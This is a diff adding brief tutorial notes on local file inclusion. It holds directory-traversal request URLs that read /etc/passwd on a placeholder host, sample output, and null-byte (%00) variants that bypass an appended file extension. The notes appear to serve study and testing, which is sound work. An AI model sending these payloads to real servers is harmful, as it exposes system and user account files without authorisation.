@@ -1,0 +1,30 @@
+The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application
+
+Can  lead to:
+-DOS(Denial of Service)
+-Code execution on the web server
+-Code execution on client side (JAVASCRIPT),cross site scripting (XSS)
+
+L(local)FI-process of including files, that are already locally present on the server
+a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing directory traversal characters (such as dot-dot-slash) to be injected.
+Caused-
+-PHP
+-JSP
+-ASP
+
+eg.:"http://vulnerable_host/preview.php?file=../../../../etc/passwd"
+Output:root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+alex:x:500:500:alex:/home/alex:/bin/bash
+margo:x:501:501::/home/margo:/bin/bash
+...
+
+eg.:"<?php “include/”.include($_GET['filename'].“.php”); ?>"
+Output:simple substitution with arbitrary filename would not work as the postfix 'php' is appended
+%00 effectively presents the end of the string, any characters after this special byte will be ignored. Thus, the following request will also return an attacker list of basic users attributes:
+
+http://vulnerable_host/preview.php?file=../../../../etc/passwd%00
+http://vulnerable_host/preview.php?file=../../../../etc/passwd%00jpg 
+
+
